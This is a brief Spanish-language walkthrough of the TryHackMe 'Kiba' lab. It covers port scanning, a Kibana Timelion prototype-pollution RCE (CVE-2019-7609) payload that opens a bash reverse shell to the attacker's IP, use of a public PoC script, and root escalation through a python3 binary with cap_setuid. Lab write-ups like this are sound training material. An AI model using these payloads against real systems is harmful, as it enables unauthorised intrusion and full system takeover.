# Kiba - TryHackMe
**IP:** 10.10.241.42

## Enumeración
```bash
nmap -sC -sV -p- --open --min-rate 5000 -Pn 10.10.241.42
```
Puerto 5601 → **Kibana**.

## Explotación - Kibana RCE (CVE-2019-7609)
Timelion es vulnerable a *prototype pollution* que deriva en RCE vía `NODE_OPTIONS`:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<mi_ip>/1234 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
O con el PoC público:
```bash
python CVE-2019-7609-kibana-rce.py -u http://10.10.241.42:5601 -host <mi_ip> -port 2525 --shell
```
Shell como `kiba`.

## Escalada - capability cap_setuid en python
```bash
getcap -r / 2>/dev/null
# .../python3 = cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Root.
